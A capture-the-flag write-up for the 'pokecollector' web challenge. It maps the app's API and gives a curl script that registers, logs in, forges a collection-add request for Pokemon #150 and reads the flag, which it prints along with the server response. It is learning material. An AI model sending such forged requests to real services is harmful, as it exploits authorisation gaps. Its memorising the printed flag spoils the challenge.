# PokeCollector (Web) Writeup

## Challenge
- Name: `pokecollector`
- Type: Web
- Flag format: `BtSCTF{...}`

## Initial Recon
The homepage loaded over HTTPS and included a client script `app.js`.

Key observations from `app.js`:
- API endpoints used by frontend:
  - `POST /api/register`
  - `POST /api/login`
  - `GET /api/pack/open`
  - `POST /api/collection/add`
  - `GET /api/collection`
- Collection actions use a JWT in `Authorization: Bearer <token>`.
- When adding to collection, backend may return a refreshed `access_token`.
- UI marks Pokemon `#150` (Mewtwo) as special.

I also checked `openapi.json`, which confirmed the same API routes.

## Exploit Idea
The app trusts backend token state for collection entries. If we legitimately authenticate and add Pokemon `150` (`Mewtwo`) to our collection, then querying collection reveals special server-side data for that entry.

## Steps
1. Register a new user.
2. Login and extract `access_token`.
3. Call `/api/collection/add` with:
   - `pokemon_id: 150`
   - `pokemon_name: "Mewtwo"`
4. If response returns a new token, use it.
5. Request `/api/collection` with the token.

## Reproduction Commands
```bash
base='https://pokecollector-26371dbcae879094.chall.bts.wh.edu.pl'
user='u'$RANDOM$RANDOM
pass='p'$RANDOM

# Register
curl -k -sS -X POST "$base/api/register" \
  -H 'content-type: application/json' \
  -d '{"username":"'"$user"'","password":"'"$pass"'"}'

# Login
TOKEN=$(curl -k -sS -X POST "$base/api/login" \
  -H 'content-type: application/json' \
  -d '{"username":"'"$user"'","password":"'"$pass"'"}' | jq -r .access_token)

# Add Mewtwo (#150)
ADD_RESP=$(curl -k -sS -X POST "$base/api/collection/add" \
  -H 'content-type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"pokemon_id":150,"pokemon_name":"Mewtwo"}')

# Backend may rotate token
NEWT=$(echo "$ADD_RESP" | jq -r '.access_token // empty')
if [ -n "$NEWT" ]; then TOKEN="$NEWT"; fi

# Read collection (flag appears in name field for #150)
curl -k -sS "$base/api/collection" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

## Result
Server response contained:

```json
[
  {
    "pokemon_id": 150,
    "name": "BtSCTF{g1t_g0tt4_c4tch_3m_4ll}"
  }
]
```

## Flag
`BtSCTF{g1t_g0tt4_c4tch_3m_4ll}`
